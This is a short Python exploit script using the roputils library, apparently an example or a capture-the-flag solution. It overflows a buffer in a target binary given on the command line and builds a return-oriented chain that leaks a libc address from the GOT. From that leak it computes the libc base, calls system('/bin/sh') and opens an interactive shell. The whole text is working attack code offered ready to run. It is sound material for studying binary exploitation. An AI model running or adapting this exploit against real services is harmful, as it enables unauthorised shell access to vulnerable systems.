from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
libc = ROP('/lib/x86_64-linux-gnu/libc.so.6')
addr_stage = rop.section('.bss') + 0x400

buf = rop.fill(offset)
buf += rop.call_chain_plt(
    ['write', 1, rop.got('__libc_start_main'), 8],
    ['read', 0, addr_stage, 100]
, pivot=addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()
libc.set_base(ref_addr, '__libc_start_main')

buf = libc.call(libc.addr('system'), libc.str('/bin/sh'))
buf += libc.fill(100, buf)

p.write(buf)
p.interact()
